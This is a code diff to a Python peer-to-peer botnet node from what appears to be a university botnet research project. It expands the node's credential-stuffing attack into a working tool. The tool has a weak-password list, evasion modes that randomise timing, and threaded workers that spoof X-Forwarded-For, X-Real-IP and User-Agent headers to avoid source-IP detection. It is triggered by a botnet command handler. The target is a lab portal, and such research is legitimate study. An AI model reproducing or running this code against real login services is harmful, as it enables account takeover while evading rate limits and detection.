@@ -1,3 +1,5 @@
+File: p2p_node.py
+================
 """
 ====================================================
  AUA CS 232/337 — Botnet Research Project
@@ -434,45 +436,155 @@ def _attack_cryptojack(duration: int, cpu: float, stop: threading.Event):
 
 
 def _attack_cred_stuffing(target: str, port: int, duration: int,
+                            mode: str, jitter_ms: int, n_workers: int,
                             stop: threading.Event):
-    """Credential stuffing — POST to /login with known weak pairs."""
+    """
+    Credential stuffing against /login.
+
+    Three modes — matching kademlia_p2p.c and cred_stuffing.py:
+      'bot'         — fixed 500 ms interval (CV ≈ 0.01, easily detected)
+      'jitter'      — ±jitter_ms randomisation around 500 ms base
+      'distributed' — n_workers threads each spoofing a different
+                      X-Forwarded-For IP (hardest to detect by source IP)
+
+    Form fields use 'email'/'password' to match fake_portal.py's /login
+    endpoint — NOT 'username'/'password'.
+    """
+    # Credential list mirrors cred_stuffing.py DEFAULT_CREDS (subset for speed)
     CREDS = [
-        ("admin","admin"), ("root","root"), ("admin","password"),
-        ("user","user"), ("admin","1234"), ("root","toor"),
-        ("admin","admin123"), ("guest","guest"), ("test","test"),
-        ("support","support"), ("admin","pass"), ("root","pass"),
-        ("admin","12345"), ("root","12345"), ("user","password"),
-        ("pi","raspberry"), ("admin",""), ("root",""),
-        ("admin","admin1"), ("operator","operator"),
-        ("admin","system"), ("root","system"),
-        ("ubnt","ubnt"), ("admin","ubnt"),
-        ("supervisor","supervisor"), ("user","1234"),
-        ("admin","changeme"), ("root","123456"), ("admin","123456"),
-        ("tech","tech"),
+        ("alice@example.com",  "password123"),
+        ("bob@example.com",    "123456"),
+        ("admin@example.com",  "admin"),
+        ("admin@example.com",  "admin123"),
+        ("admin@example.com",  "password"),
+        ("admin@example.com",  "securePass123!"),   # succeeds on fake_portal
+        ("root@server.com",    "root"),
+        ("root@server.com",    "toor"),
+        ("user@example.com",   "user"),
+        ("user@example.com",   "password1"),
+        ("test@test.com",      "test"),
+        ("support@app.com",    "support"),
+        ("guest@example.com",  "guest"),
+        ("pi@raspberry.com",   "raspberry"),
+        ("admin@example.com",  "1234"),
+        ("charlie@corp.com",   "charlie2024"),
+        ("dave@mail.com",      "monkey"),
+        ("eve@email.com",      "sunshine"),
+        ("frank@net.com",      "dragon"),
+        ("grace@web.io",       "batman"),
+        ("john.doe@corp.com",  "John2024"),
+        ("info@company.com",   "info2024"),
+        ("admin@example.com",  "letmein"),
+        ("bob@example.com",    "iloveyou"),
+        ("alice@example.com",  "qwerty"),
+        ("root@server.com",    "123456"),
+        ("user@example.com",   "user"),
+        ("test@test.com",      "test123"),
+        ("admin@example.com",  "pass"),
+        ("support@app.com",    "support123"),
     ]
     url = f"http://{target}:{port}/login"
-    print(f"[ATTACK] CRED STUFFING -> {url}  pairs={len(CREDS)}")
-    try:
-        import requests
-    except ImportError:
-        print("[ATTACK] requests not installed — pip3 install requests"); return
+    BASE_INTERVAL_MS = 500
 
-    end = time.time() + duration
-    hits = 0
-    while time.time() < end and not stop.is_set():
-        for user, pwd in CREDS:
-            if stop.is_set() or time.time() > end: break
-            try:
-                r = requests.post(url,
-                                  data={"username": user, "password": pwd},
-                                  timeout=3)
-                if r.status_code == 200:
-                    print(f"[ATTACK] CRED HIT: {user}:{pwd}")
-                    hits += 1
-            except Exception:
-                pass
-            stop.wait(random.uniform(0.3, 0.8))
-    print(f"[ATTACK] CRED STUFFING done. Hits: {hits}")
+    try:
+        import urllib.request
+        import urllib.parse
+        import urllib.error
+    except ImportError:
+        print("[ATTACK] urllib not available"); return
+
+    def _post_login(email: str, password: str,
+                    extra_headers: dict = None) -> int:
+        """POST to /login. Returns HTTP status code (0 on error)."""
+        body = urllib.parse.urlencode(
+            {"email": email, "password": password}
+        ).encode()
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (compatible; Research/1.0)",
+        }
+        if extra_headers:
+            headers.update(extra_headers)
+        req = urllib.request.Request(url, data=body, headers=headers)
+        try:
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                return resp.status
+        except urllib.error.HTTPError as e:
+            return e.code
+        except Exception:
+            return 0
+
+    def _sleep(base_ms: int, jitter: int):
+        """Sleep with mode-aware timing."""
+        if mode == "bot":
+            time.sleep(base_ms / 1000.0)
+        else:
+            delta = random.uniform(-jitter, jitter)
+            time.sleep(max(50, base_ms + delta) / 1000.0)
+
+    def _fake_ip() -> str:
+        return (f"10.{random.randint(0,255)}"
+                f".{random.randint(1,254)}"
+                f".{random.randint(1,254)}")
+
+    hits: list = []
+    lock = threading.Lock()
+
+    print(f"[ATTACK] CRED STUFFING -> {url}"
+          f"  mode={mode}  jitter=±{jitter_ms}ms"
+          f"  pairs={len(CREDS)}  duration={duration}s")
+
+    if mode == "distributed":
+        # ── Distributed mode: n_workers threads, each with a fake source IP ──
+        chunk = max(1, len(CREDS) // max(1, n_workers))
+
+        def _worker(creds_chunk: list, wid: int):
+            fake_ip = _fake_ip()
+            hdrs = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip,
+                    "User-Agent": f"Mozilla/5.0 (rv:{random.randint(90,120)}.0)"}
+            end = time.time() + duration
+            for email, pwd in creds_chunk:
+                if stop.is_set() or time.time() > end:
+                    break
+                status = _post_login(email, pwd, hdrs)
+                if status == 200:
+                    with lock:
+                        hits.append((email, pwd))
+                    print(f"[ATTACK-{wid}] CRED HIT: {email}:{pwd}"
+                          f" (from {fake_ip})")
+                _sleep(BASE_INTERVAL_MS // max(1, n_workers), jitter_ms)
+
+        threads = []
+        for wid in range(n_workers):
+            c = CREDS[wid * chunk:(wid + 1) * chunk]
+            t = threading.Thread(target=_worker, args=(c, wid), daemon=True)
+            threads.append(t)
+        for t in threads:
+            t.start()
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set():
+            time.sleep(0.5)
+        stop.set()
+        for t in threads:
+            t.join(timeout=3)
+
+    else:
+        # ── Bot / jitter mode: single-threaded sequential ──────────────────
+        end = time.time() + duration
+        while time.time() < end and not stop.is_set():
+            for email, pwd in CREDS:
+                if stop.is_set() or time.time() > end:
+                    break
+                status = _post_login(email, pwd)
+                if status == 200:
+                    with lock:
+                        hits.append((email, pwd))
+                    print(f"[ATTACK] CRED HIT: {email}:{pwd}")
+                _sleep(BASE_INTERVAL_MS, jitter_ms)
+
+    print(f"[ATTACK] CRED STUFFING done."
+          f"  mode={mode}  hits={len(hits)}"
+          + (f"  valid={hits}" if hits else ""))
 
 
 # ── Kademlia Node ─────────────────────────────────────────────
@@ -912,9 +1024,12 @@ class KademliaNode:
 
         elif cmd_type == "cred_stuffing":
             self._launch("cred_stuffing", _attack_cred_stuffing,
-                         cmd.get("target", "192.168.100.20"),
-                         int(cmd.get("port", 80)),
-                         int(cmd.get("duration", 120)))
+                         cmd.get("target",   "192.168.100.20"),
+                         int(cmd.get("port",      80)),
+                         int(cmd.get("duration",  120)),
+                         cmd.get("mode",    "jitter"),
+                         int(cmd.get("jitter",    200)),
+                         int(cmd.get("workers",   3)))
 
         elif cmd_type == "stop_all":
             self._stop_all_attacks()
